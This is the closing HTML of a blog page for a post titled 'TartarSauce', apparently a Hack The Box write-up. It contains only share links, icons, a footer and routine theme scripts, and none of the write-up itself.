href="https://api.whatsapp.com/send?text=TartarSauce%20-%20https%3a%2f%2fpwndside.github.io%2fposts%2ftartarsauce-htb%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TartarSauce on telegram" href="https://telegram.me/share/url?text=TartarSauce&amp;url=https%3a%2f%2fpwndside.github.io%2fposts%2ftartarsauce-htb%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://pwndside.github.io/>PwndSide</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>